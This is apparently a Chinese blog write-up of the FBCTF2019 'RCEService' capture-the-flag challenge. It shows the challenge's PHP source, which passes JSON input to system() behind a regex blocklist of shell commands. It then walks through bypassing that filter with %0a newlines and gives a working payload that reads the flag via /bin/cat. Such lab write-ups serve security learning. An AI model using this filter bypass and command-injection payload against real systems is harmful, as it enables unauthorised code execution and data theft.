---
layout: mypost
title: "[FBCTF2019]RCEService"
categories: [ctf_wp]
---

（师傅们注意！！！这个题其实在比赛的时候是给出源码的，这个题如果纯黑盒rce的话确实还是有一点困难的，一开始看了20分钟，各种字典都跑了一遍确实是没思路，当然我是小菜鸡，下面把源码给师傅们奉上）

（还有就是这个题并不难，我更多的是想拿这个题做一个引子，让大家去理解一下正则表达式的其中一种形式，当然也是ctf里面最常见的一种形式，具体可以去看这篇文章---CTF中那些奇奇怪怪的正则表达式）

```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

1.接下来就是一个白盒审计的问题了，这个源码还是很好理解的哈，简单解释一下吧，变量json接受传参，先确保是一个str类型的，然后经过一个正则表达式的过滤，最后没有被正则匹配过滤掉的就把它赋值到变量cmd，然后用一个json\_decode的函数来处理这个变量cmd（这个函数是专门用来处理json这种数据类型的，所以一开始在url中传值的时候就要传成json的数据格式，众所周知就是键值对的格式哈），最后就会带到system这个函数里去执行我们的payload

2.这题的重点还是针对于这个正则匹配的绕过，这个也很简单，一个%0a就行，因为这种做多了大家都知道，这个正则表达式的后面没有加特殊的元字符，所以直接%0a就行哈，这题我的第一个payload就是

```
\{\%0a"cmd":"ls%20/"}
```

但是并没有回显根目录下的内容，而且还返回了Hacking attempt detected，当时我就试着去往它后面加一个%0a，结果真的可以（这里真的是运气，完全不知道为什么，这个之后经过师傅的讲解以及自己对正则表达式的调试终于是弄明白了，但网上对这个payload的原理真的是一点解释也没有，读者们想要弄懂可以看我的这篇文章---CTF中那些奇奇怪怪的正则表达式，里面详细讲解了关于这种情况的正则表达式的运作原理，同时也会去给大家展示这题的另一种玩法）

3.然后就开始找flag在哪里，具体找的过程和payload就不演示了，最终发现在/home/rceservice这个目录下面

![](屏幕截图-2023-09-13-201622.png)

然后就开始cat，但发现怎么cat这个flag文件，它都是啥也不显示，感觉是不是把cat给过滤了，然后又去审计了一遍源码，发现了第一行那串神奇的代码，学习后知道了putenv('PATH=/home/rceservice/jail');修改了环境变量，所以只能使用绝对路径使用cat命令，`cat`命令在/bin文件夹下（这个常识哈）

4.然后构造最终payload

```
?cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
```

![](屏幕截图-2023-09-13-202039.png)

最后唠叨一句哈，我觉得这题并不难，重点还是那两个%0a，大家不明白的真的可以去看我的这篇文章---CTF中那些奇奇怪怪的正则表达式，我会给出一些自己的见解

Finish!!!